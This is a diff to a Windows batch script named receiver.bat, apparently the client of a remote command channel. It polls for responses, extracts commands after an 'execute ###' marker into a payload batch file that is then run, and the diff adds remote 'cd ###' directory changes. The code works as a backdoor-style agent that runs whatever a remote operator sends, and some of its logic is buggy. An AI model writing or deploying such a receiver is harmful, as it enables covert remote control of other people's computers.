@@ -1,5 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
+setlocal EnableDelayedExpansion
 
 :: ------------------------------------------------------------------
 :: receiver.bat - Debugging version
@@ -95,11 +96,34 @@ timeout /t %POLL_DELAY% >nul
 goto MAIN_LOOP
 )
 
+if /I "%CHECKLINE:~0,6%"=="cd ###" (
+    echo ----------------------------------------------------
+    echo [INFO] Executing cd command
+    echo ----------------------------------------------------
+    rem extract everything after "cd ###"
+    set "STRIPPED=%CHECKLINE:~6%"
+    for /f "tokens=* delims= " %%a in ("!STRIPPED!") do set "STRIPPED=%%a"
+
+    call :log "----------------------------------------------------"
+    call :log "[INFO] Executing cd command"
+    call :log "----------------------------------------------------"
+
+    rem actually change directory
+    cd "!STRIPPED!"
+    if errorlevel 1 (
+        echo [ERROR] Could not change directory to "!STRIPPED!"
+        call :log "[ERROR] Could not change directory to !STRIPPED!"
+    ) else (
+        echo [INFO] Changed directory to: "!STRIPPED!"
+        call :log "[INFO] Changed directory to: !STRIPPED!"
+    )
+)
+
 echo [INFO] Received response (logged). See %LOGFILE% for raw response.
 echo.
 
 :: 3) Extrahiere Payload und schreibe sichere Payload-Datei (literal)
-powershell -NoProfile -Command ^ "try { $text = Get-Content -Raw -LiteralPath '%RESP%'; if ($text -match '(?s)execute ### (.*)') { $cmd = $Matches[1]; [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`n$cmd\", [System.Text.Encoding]::ASCII) } else { [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`necho __NO_PAYLOAD__\", [System.Text.Encoding]::ASCII) } } catch { [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`necho __ERROR_PARSING_RESPONSE__\", [System.Text.Encoding]::ASCII) }" 2>nul
+powershell -NoProfile -Command ^ "try { $text = Get-Content -Raw -LiteralPath '%RESP%'; if ($text -match '(?s)execute ### (.*)') { $cmd = $Matches[1]; [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`n$cmd\", [System.Text.Encoding]::ASCII) } else { if ($text -match '(?s)cd ###(.*)') { $cmd = $Matches[1]; [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`ncd\", [System.Text.Encoding]::ASCII) } else { [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`necho __NO_PAYLOAD__\", [System.Text.Encoding]::ASCII) } } } catch { [System.IO.File]::WriteAllText('%PAYLOAD%', \"@echo off`r`necho __ERROR_PARSING_RESPONSE__\", [System.Text.Encoding]::ASCII) }" 2>nul
 
 powershell -Command "(Get-Content '%PAYLOAD%' -Raw) -replace '\\n', \"`n\" | Set-Content '%PAYLOAD%'"
 
